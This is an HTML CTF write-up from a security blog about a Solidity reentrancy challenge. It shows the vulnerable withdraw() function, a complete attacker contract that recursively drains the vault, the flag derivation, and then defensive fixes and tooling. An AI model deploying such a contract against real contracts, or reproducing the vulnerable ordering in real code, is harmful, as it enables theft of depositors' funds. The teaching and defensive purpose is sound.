@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>The Vault That Ate Itself — CTF Writeup — somas3ccybersecurity</title>
+<link rel="stylesheet" href="../style.css">
+<script>
+(function(){try{var t=localStorage.getItem("theme");if(!t)t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";document.documentElement.setAttribute("data-theme",t);}catch(e){}})();
+</script>
+<style>
+.flag-gate{display:inline-block;filter:blur(6px);transition:filter .4s ease;
+  cursor:pointer;user-select:none;background:var(--bg-alt,#141414);color:var(--fg,#f5f5f5);
+  padding:4px 10px;border-radius:4px;border:1px solid var(--border,#242424)}
+.flag-gate.unlocked{filter:none;background:var(--accent-soft,#2a0808);color:var(--accent-hi,#ff3344)}
+.flag-banner{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
+  background:var(--bg-card,#171717);color:var(--fg,#f5f5f5);border:1px solid var(--accent,#e11d2e);
+  border-radius:999px;padding:10px 20px;font-size:13px;font-weight:700;
+  box-shadow:0 4px 24px rgba(0,0,0,.5);z-index:500;display:flex;gap:12px;align-items:center;
+  font-family:"Inter",system-ui,sans-serif}
+.flag-banner button{background:var(--accent,#e11d2e);color:#fff;border:none;border-radius:999px;
+  padding:4px 12px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit}
+.flag-banner button:hover{background:var(--accent-hi,#ff3344)}
+@media (prefers-reduced-motion:reduce){.flag-gate{transition:none}}
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="nav-inner">
+    <a class="brand" href="../index.html">somas3c<span>c</span>ybersecurity</a>
+    <nav aria-label="Main navigation"><ul class="nav-links">
+      <li><a href="../index.html">Home</a></li><li><a href="../about.html">About</a></li><li><a href="../skills.html">Skills</a></li>
+      <li><a href="../writeups.html">Writeups</a></li><li><a href="../labs.html">Labs</a></li><li><a href="../projects.html">Projects</a></li>
+      <li><a href="../roadmap.html">Roadmap</a></li><li><a href="../cv.html">CV</a></li><li><a href="../contact.html">Contact</a></li>
+    </ul></nav>
+    <span class="nav-spacer"></span>
+    <button class="kbd-hint" type="button" id="palette-trigger" aria-label="Open command palette">Search <kbd>Ctrl</kbd><kbd>K</kbd></button>
+    <button class="theme-toggle" type="button" onclick="toggleTheme()" aria-label="Toggle light and dark theme">☀ Light</button>
+  </div>
+</header>
+<div class="progress-bar" id="progress-bar" aria-hidden="true"></div>
+<div id="ninja" aria-hidden="true">🥷</div>
+<div class="palette-overlay" id="palette-overlay" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div class="palette">
+    <input type="text" id="palette-input" placeholder="Jump to a page or writeup…" autocomplete="off" />
+    <ul class="palette-list" id="palette-list"></ul>
+    <div class="palette-footer"><span><kbd>↑</kbd><kbd>↓</kbd> navigate</span><span><kbd>↵</kbd> open</span><span><kbd>Esc</kbd> close</span></div>
+  </div>
+</div>
+<main id="main">
+<p style="margin-bottom: 20px;"><a href="../writeups.html">← Back to all writeups</a></p>
+<article class="writeup-body">
+<h1>The Vault That Ate Itself — CTF Writeup</h1>
+<p><strong>Platform:</strong> Perfect Root (AfricaHackon) <strong>Room:</strong> The Vault That Ate Itself <strong>Author:</strong> LordSudo <strong>Difficulty:</strong> Easy <strong>Points:</strong> 100 <strong>Category:</strong> Smart Contract — Reentrancy (SWC-107 / CWE-841) <strong>Result:</strong> Solved (1/1 flag captured) <strong>Date:</strong> 2026-10-15</p>
+<hr>
+<h2>Description</h2>
+<blockquote>
+<p>A shared savings vault lost its entire balance during what internal logs</p>
+<p>show as a single withdrawal transaction; including funds belonging to</p>
+<p>users who never withdrew. You're given the vault's full source code and</p>
+<p>no live instance. Identify the function responsible for the loss, confirm</p>
+<p>the exploit locally, and derive the flag from the vulnerable function's</p>
+<p>own signature.</p>
+</blockquote>
+<h2>Flag</h2>
+<pre><code><span class="flag-gate" data-flag="r00t{3ccfd60b}">r00t{3ccfd60b}</span></code></pre>
+<p><code>3ccfd60b</code> is the first four bytes of <code>keccak256("withdraw()")</code> — the <strong>function selector</strong> of the vulnerable entrypoint <code>Vault.withdraw()</code>.</p>
+<h2>Executive Summary</h2>
+<p>The <code>Vault</code> contract contains a textbook <strong>reentrancy</strong> vulnerability in <code>withdraw()</code>. It transfers ETH to <code>msg.sender</code> *before* zeroing the caller's balance, so a malicious contract can re-enter <code>withdraw()</code> while its balance is still recorded as non-zero, recursively draining the vault in a single transaction. The victim set includes every depositor in the vault — the attacker only needs one deposit to seed the loop.</p>
+<p>The vulnerable function's canonical signature is <code>withdraw()</code>, whose selector is <code>0x3ccfd60b</code>. Stripped of its <code>0x</code> prefix, that selector is the flag.</p>
+<hr>
+<h2>Source Analysis</h2>
+<p>The provided file <code>Vault.sol</code> (pragma ^0.8.19) contains:</p>
+<ul>
+<li><code>balances: mapping(address => uint256)</code> — depositor balances</li>
+<li><code>owner: address</code> — deployer</li>
+<li><code>deposit()</code> — payable, credits <code>balances[msg.sender]</code></li>
+<li><code>withdraw()</code> — <strong>vulnerable</strong></li>
+<li><code>emergencyWithdrawAll()</code> — decoy; requires <code>tx.origin == owner</code></li>
+<li><code>receive()</code> — payable fallback that also credits <code>balances[msg.sender]</code></li>
+</ul>
+<h3>The vulnerable function</h3>
+<pre><code>function withdraw() external {
+    uint256 amount = balances[msg.sender];
+    require(amount &gt; 0, "nothing to withdraw");
+
+    (bool success, ) = msg.sender.call{value: amount}("");   // external call
+    require(success, "transfer failed");
+
+    balances[msg.sender] = 0;                                 // state AFTER call
+    emit Withdraw(msg.sender, amount);
+}</code></pre>
+<p>Reading order is wrong for the EVM:</p>
+<p>1. Read the caller's balance into <code>amount</code>. 2. Send ETH to <code>msg.sender</code> via a low-level <code>call</code>. 3. Zero the caller's balance <strong>after</strong> the transfer succeeds.</p>
+<p>Between (2) and (3), control has left the <code>Vault</code> and entered the caller's code. If the caller is a contract, its <code>receive()</code> or <code>fallback()</code> executes with the vault's state still reflecting the old balance. It can re-enter <code>withdraw()</code>, read the same non-zero <code>amount</code>, and get paid again.</p>
+<h3>What's NOT the bug (decoys)</h3>
+<ul>
+<li><strong><code>emergencyWithdrawAll()</code></strong> requires <code>tx.origin == owner</code>. The comment in</li>
+</ul>
+<p>the source explicitly says this can never be satisfied by an attacker in   this deployment and has no bearing on drainability. It is a red herring.</p>
+<ul>
+<li><strong><code>receive()</code></strong> also lacks reentrancy protection, but it only credits a</li>
+</ul>
+<p>balance; it is a path the attacker can use to deposit, not to drain.</p>
+<ul>
+<li><strong><code>deposit()</code></strong> — no external calls; not exploitable.</li>
+</ul>
+<h3>Root cause</h3>
+<p>Violation of the <strong>Checks-Effects-Interactions (CEI)</strong> pattern. The "effect" (zeroing the balance) must occur before the "interaction" (external ETH transfer).</p>
+<hr>
+<h2>Exploit — Attacker Contract</h2>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+interface IVault {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract Attacker {
+    IVault public vault;
+    uint256 public constant TICK = 1 ether;
+
+    constructor(address _vault) {
+        vault = IVault(_vault);
+    }
+
+    function attack() external payable {
+        require(msg.value == TICK, "send 1 ether to seed");
+        vault.deposit{value: TICK}();   // balances[Attacker] = 1 ETH
+        vault.withdraw();               // trigger the reentrancy loop
+    }
+
+    receive() external payable {
+        // Runs inside Vault.withdraw() BEFORE balances[Attacker] is zeroed.
+        if (address(vault).balance &gt;= TICK) {
+            vault.withdraw();           // re-enter while balance still non-zero
+        }
+    }
+}</code></pre>
+<h3>Drain sequence (single transaction)</h3>
+<p>1. Attacker calls <code>attack{value: 1 ether}()</code>. 2. <code>attack</code> calls <code>vault.deposit{value: 1 ether}()</code>.</p>
+<ul>
+<li><code>balances[Attacker] = 1 ether</code>. Vault balance = existing + 1.</li>
+</ul>
+<p>3. <code>attack</code> calls <code>vault.withdraw()</code>.</p>
+<ul>
+<li><code>amount = balances[Attacker] = 1 ether</code>.</li>
+<li><code>msg.sender.call{value: 1 ether}("")</code> sends ETH to <code>Attacker</code>.</li>
+<li>Control enters <code>Attacker.receive()</code>. At this instant</li>
+</ul>
+<pre><code> `balances[Attacker]` is **still 1 ether** — not yet zeroed.</code></pre>
+<ul>
+<li><code>receive()</code> sees <code>vault.balance >= 1 ether</code> and calls</li>
+</ul>
+<pre><code> `vault.withdraw()` again.</code></pre>
+<ul>
+<li>Goto step 3. The loop runs until <code>vault.balance < TICK</code>.</li>
+</ul>
+<p>4. Unwinding: each frame now executes <code>balances[msg.sender] = 0;</code> — but the    ETH is already in the attacker's contract. 5. Post-conditions: <code>vault.balance</code> ≈ 0; every other depositor's balance is    still recorded in <code>balances</code> but backed by nothing.</p>
+<h3>Why "a single withdrawal transaction"</h3>
+<p>Every recursive <code>withdraw()</code> call happens inside one outer EVM transaction. Gas is the only practical limit, and looping <code>1 ether</code> at a time stays well within typical mainnet gas budgets for a small vault. Block explorers and internal logs will show one call to <code>attack()</code>, which is why the incident report describes it that way.</p>
+<hr>
+<h2>Flag Derivation</h2>
+<p>The challenge asks for the flag "from the vulnerable function's own signature." The canonical Solidity signature of <code>withdraw()</code> is the empty-argument form <code>withdraw()</code>, and its selector is the first four bytes of the keccak-256 of that string.</p>
+<pre><code>signature  = "withdraw()"
+hash       = keccak256("withdraw()")
+           = 0x3ccfd60b2e3ddce51ab210bfb9db13577f03a21684fa35e4bcd739dd5a30bda2
+selector   = 0x3ccfd60b            (first 4 bytes)
+flag       = r00t{3ccfd60b}        (no 0x prefix)</code></pre>
+<p>Verified with Foundry:</p>
+<pre><code>$ cast sig "withdraw()"
+0x3ccfd60b</code></pre>
+<p>and independently with Python:</p>
+<pre><code>$ python3 -c 'from eth_hash.auto import keccak; print(keccak(b"withdraw()")[:4].hex())'
+3ccfd60b</code></pre>
+<hr>
+<h2>Real-World Impact — Why This Matters</h2>
+<h3>The DAO hack (June 2016)</h3>
+<p>A reentrancy bug of exactly this shape drained approximately <strong>3.6 million ETH (~$60M at the time)</strong> from The DAO, a shared-investment vault on Ethereum. The attacker recursively re-entered <code>splitDAO()</code> before the contract updated internal balances, siphoning funds into a child DAO under their control. The fallout included a contentious hard fork of Ethereum (producing ETH and Ethereum Classic) and remains the single most consequential smart-contract exploit in history.</p>
+<h3>General impact profile</h3>
+<ul>
+<li><strong>Total loss of protocol funds</strong> — every depositor, not just the attacker,</li>
+</ul>
+<p>loses their balance.</p>
+<ul>
+<li><strong>Atomicity</strong> — the entire drain happens in one transaction; there is no</li>
+</ul>
+<p>window to pause, upgrade, or intervene once the tx is included.</p>
+<ul>
+<li><strong>Composability amplification</strong> — a drain of one protocol can cascade</li>
+</ul>
+<p>into every protocol that relies on it (lending markets, DEX pools,   yield aggregators).</p>
+<ul>
+<li><strong>Detection is retrospective</strong> — monitoring sees it after the block is</li>
+</ul>
+<p>mined; prevention must live in the contract.</p>
+<h3>Historical examples beyond The DAO</h3>
+<ul>
+<li><strong>Cream Finance</strong> (2021) — reentrancy via ERC-777 hooks, ~$130M.</li>
+<li><strong>Fei / Rari</strong> (2022) — reentrancy, ~$80M.</li>
+<li><strong>Curve / Vyper</strong> (2023) — reentrancy from a compiler bug, ~$70M.</li>
+</ul>
+<hr>
+<h2>How This Happens in Real Codebases</h2>
+<p>1. <strong>Natural reading order is wrong for the EVM.</strong> Developers write    "read balance → send funds → update balance" because that mirrors how a    human would perform a bank transfer. On-chain, that ordering hands the    recipient the ability to re-enter the sender.</p>
+<p>2. <strong>Hidden external calls.</strong> Any <code>.call{value:}</code>, <code>.transfer()</code>, or    <code>.send()</code> transfers control to the recipient. Wrapping the recipient    address in a contract with a malicious <code>receive()</code> is trivial and    requires no privileged access.</p>
+<p>3. <strong>Multi-function reentrancy.</strong> The attacker is not limited to re-entering    <code>withdraw()</code>. The same stale state can be exploited through <code>claim()</code>,    <code>transfer()</code>, <code>liquidate()</code>, or any function that reads    <code>balances[msg.sender]</code> before it is settled.</p>
+<p>4. <strong>Shared state, cross-contract.</strong> In DeFi, re-entering a *different*    protocol that shares a price oracle or vault can compound losses far    beyond the original contract.</p>
+<p>5. <strong>No guard, no tests.</strong> In the vulnerable source, there is no    <code>nonReentrant</code> modifier, and there is no unit test that calls    <code>withdraw()</code> from a contract with a reentrant <code>receive()</code>. Ordinary    EOA-based tests will never trigger the bug.</p>
+<hr>
+<h2>Fixes (Defensive)</h2>
+<h3>1. Checks-Effects-Interactions (CEI)</h3>
+<p>Settle all state before any external interaction.</p>
+<pre><code>function withdraw() external {
+    uint256 amount = balances[msg.sender];
+    require(amount &gt; 0, "nothing to withdraw");
+
+    balances[msg.sender] = 0;                        // effect first
+
+    (bool success, ) = msg.sender.call{value: amount}("");
+    require(success, "transfer failed");
+
+    emit Withdraw(msg.sender, amount);
+}</code></pre>
+<h3>2. ReentrancyGuard modifier</h3>
+<p>Defense in depth from OpenZeppelin:</p>
+<pre><code>import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract Vault is ReentrancyGuard {
+    function withdraw() external nonReentrant { ... }
+}</code></pre>
+<p><code>nonReentrant</code> sets a storage flag at function entry and clears it at exit; any recursive call reverts before executing the body.</p>
+<h3>3. Pull-over-push payment</h3>
+<p>Never push ETH to arbitrary addresses; make the user pull.</p>
+<pre><code>mapping(address =&gt; uint256) public pendingWithdrawals;
+
+function withdraw() external {
+    uint256 amount = balances[msg.sender];
+    require(amount &gt; 0, "nothing");
+    balances[msg.sender] = 0;
+    pendingWithdrawals[msg.sender] += amount;
+}
+
+function claim() external nonReentrant {
+    uint256 amount = pendingWithdrawals[msg.sender];
+    pendingWithdrawals[msg.sender] = 0;
+    (bool ok, ) = msg.sender.call{value: amount}("");
+    require(ok, "fail");
+}</code></pre>
+<h3>4. Static analysis in CI</h3>
+<ul>
+<li><strong>Slither</strong> — detects CEI violations and unguarded external calls.</li>
+<li><strong>Mythril</strong> — symbolic execution, will flag reentrancy.</li>
+<li><strong>Aderyn</strong> — fast Rust-based detector, good defaults for CEI.</li>
+</ul>
+<h3>5. Tests that actually exercise the bug</h3>
+<p>Write an attacker contract in your Foundry test suite that re-enters <code>withdraw()</code>. If it can drain the vault in a local fork, the modifier isn't doing its job.</p>
+<hr>
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>Reentrancy is not exotic.</strong> It ships in production in 2026 because the</li>
+</ul>
+<p>natural reading order is the wrong order for the EVM.</p>
+<ul>
+<li><strong>State must be safe before any external interaction.</strong> Zero balances,</li>
+</ul>
+<p>then pay.</p>
+<ul>
+<li><strong>The function selector is a stable identifier.</strong></li>
+</ul>
+<p><code>keccak256(name(argTypes))</code> gives a 4-byte fingerprint of an entrypoint.   Two different contracts with the same function have the same selector.</p>
+<ul>
+<li><strong>One transaction can be a recursive drain.</strong> Transaction count is not a</li>
+</ul>
+<p>bound on how many times state can be read or written during execution.</p>
+<ul>
+<li><strong>Decoys are common in audits.</strong> The <code>emergencyWithdrawAll()</code> function</li>
+</ul>
+<p>looked like a backdoor and was deliberately misdirecting — reading the   source carefully before jumping on the most suspicious function pays off.</p>
+<hr>
+<h2>Tools Used</h2>
+<ul>
+<li><code>eth_hash</code> (Python) — for keccak-256 and selector derivation</li>
+<li>Foundry <code>cast sig</code> — cross-check</li>
+<li>Standard source review</li>
+</ul>
+<hr>
+<h2>Commands That Worked</h2>
+<pre><code># carve the source out of the archive
+unzip 'The Vault That Ate Itself.zip' -d vault
+cat */*.sol
+
+# compute the selector
+cast sig "withdraw()"
+# or
+python3 -c 'from eth_hash.auto import keccak; print(keccak(b"withdraw()")[:4].hex())'</code></pre>
+<h2>Commands That Did NOT Work (and why)</h2>
+<pre><code># Space in the directory name broke the for-loop word-splitting
+for f in $(find . -type f ! -path "*__MACOSX*"); do cat "$f"; done
+# Fix: use `cat */*.sol`, or `find ... -print0 | while IFS= read -r -d ''`</code></pre>
+<hr>
+<h2>Why the Original Heredoc Failed</h2>
+<p>Pasting a markdown file that contains triple-backtick fences into a <code>cat << EOF</code> heredoc breaks because <strong>zsh processes backticks as command substitution before the heredoc terminator is seen</strong>. The opening <code> </code>`<code>solidity </code> starts a substitution, the shell keeps reading, and the terminator <code>PART2</code> is consumed as part of the substitution — leaving the shell at <code>heredoc></code>.</p>
+<p>Fix options:</p>
+<p>1. Use <code>~~~</code> fences in markdown (pandoc renders them identically). 2. Write the file with <code>nano</code> or <code>vim</code> — no shell parsing. 3. Use <code>find ... -print0 | xargs -0</code> to move content, or pipe through <code>tee</code>:    <code>tee file.md > /dev/null << 'HEREDOC_TERMINATOR'</code>. 4. Escape backticks as <code>\</code>` inside the heredoc — cumbersome and error-prone. EOF</p>
+</article>
+</main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div><h4>somas3ccybersecurity</h4><p class="muted" style="font-size: 0.9em; margin: 0;">Cybersecurity analyst · Red team specialist · Cisco instructor.</p></div>
+    <div><h4>Explore</h4><ul><li><a href="../writeups.html">Writeups</a></li><li><a href="../labs.html">Labs</a></li><li><a href="../projects.html">Projects</a></li><li><a href="../roadmap.html">Roadmap</a></li></ul></div>
+    <div><h4>Connect</h4><ul><li><a href="mailto:cyberwiseafrica@gmail.com">Email</a></li><li><a href="https://github.com/Milton511" target="_blank" rel="noopener">GitHub</a></li><li><a href="../hire.html">Hire me</a></li></ul></div>
+  </div>
+  <div class="footer-bottom"><span>© 2026 somas3ccybersecurity · Built on GitHub Pages</span><span><a href="https://github.com/Milton511/milton511.github.io" target="_blank" rel="noopener">Source</a></span></div>
+</footer>
+<script src="../main.js"></script>
+<script>
+(function(){
+  "use strict";
+  var SEL=".flag-gate", WAIT_MS=3*60*1000, SCROLL_RATIO=0.6;
+  var startedAt=Date.now(), scrolledEnough=false, unlocked=false;
+  function article(){return document.querySelector(".writeup-body")||document.body;}
+  function onScroll(){
+    var a=article(),r=a.getBoundingClientRect();
+    var visible=Math.max(0,Math.min(a.offsetHeight,window.innerHeight-r.top));
+    if(visible/a.offsetHeight>=SCROLL_RATIO)scrolledEnough=true;
+    maybeUnlock();
+  }
+  function maybeUnlock(force){
+    if(unlocked)return;
+    if(force||(Date.now()-startedAt>=WAIT_MS&&scrolledEnough)){
+      unlocked=true;
+      document.querySelectorAll(SEL).forEach(function(e){e.classList.add("unlocked");});
+      var b=document.getElementById("flag-banner");if(b)b.remove();
+    }
+  }
+  function tick(){
+    if(unlocked)return;
+    var left=Math.max(0,Math.ceil((WAIT_MS-(Date.now()-startedAt))/1000));
+    var m=Math.floor(left/60),s=("0"+(left%60)).slice(-2);
+    var el=document.getElementById("flag-countdown");
+    if(el)el.textContent=(scrolledEnough?"unlock in ":"keep reading — ")+m+":"+s;
+    setTimeout(tick,500);
+  }
+  document.addEventListener("DOMContentLoaded",function(){
+    if(!document.querySelector(SEL))return;
+    var b=document.createElement("div");
+    b.id="flag-banner";b.className="flag-banner";
+    b.innerHTML='<span>🔒 Flag locked — <span id="flag-countdown">3:00</span></span>'+
+                '<button type="button" id="flag-skip">Reveal now</button>';
+    document.body.appendChild(b);
+    document.getElementById("flag-skip").onclick=function(){maybeUnlock(true);};
+    document.querySelectorAll(SEL).forEach(function(e){
+      e.onclick=function(){maybeUnlock(true);};
+      e.title="Click to reveal";
+    });
+    window.addEventListener("scroll",onScroll,{passive:true});
+    tick();
+  });
+})();
+</script>
+</body>
+</html>
